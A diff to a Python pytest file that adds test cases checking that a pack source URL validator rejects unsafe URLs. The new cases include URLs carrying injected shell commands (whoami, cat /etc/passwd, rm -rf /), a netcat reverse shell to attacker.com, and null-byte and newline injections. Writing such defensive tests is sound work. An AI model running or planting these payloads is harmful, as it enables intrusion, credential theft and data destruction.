@@ -404,12 +404,36 @@ def test_validate_pack_source_url_allows_https_github_repo_with_optional_dot_git
 @pytest.mark.parametrize(
     "url",
     [
+        # Non-https schemes
         "http://github.com/org/repo",
         "file:///tmp/repo",
         "ssh://github.com/org/repo",
+        # Localhost and loopback addresses
         "https://localhost/repo",
         "https://127.0.0.1/repo",
         "https://[::1]/repo",
+        # Command injection attempts with shell metacharacters
+        "https://github.com/org/repo;whoami",
+        "https://github.com/org/repo; cat /etc/passwd",
+        "https://github.com/org/repo|cat /etc/passwd",
+        "https://github.com/org/repo| nc -e /bin/sh attacker.com 4444",
+        "https://github.com/org/repo&&rm -rf /",
+        "https://github.com/org/repo&& whoami",
+        "https://github.com/org/repo`whoami`",
+        "https://github.com/org/repo`id`",
+        "https://github.com/org/repo$(id)",
+        "https://github.com/org/repo$(cat /etc/passwd)",
+        "https://github.com/org/repo${IFS}",
+        # Command substitution in path
+        "https://github.com/org$(id)/repo",
+        "https://github.com/org;whoami/repo",
+        # Null byte injection
+        "https://github.com/org/repo\x00",
+        "\x00https://github.com/org/repo",
+        # Newline injection
+        "https://github.com/org/repo\nwhoami",
+        "https://github.com/org/repo\r\ncat /etc/passwd",
+        "\nhttps://github.com/org/repo",
     ],
 )
 def test_validate_pack_source_url_rejects_unsafe_urls(url: str) -> None:
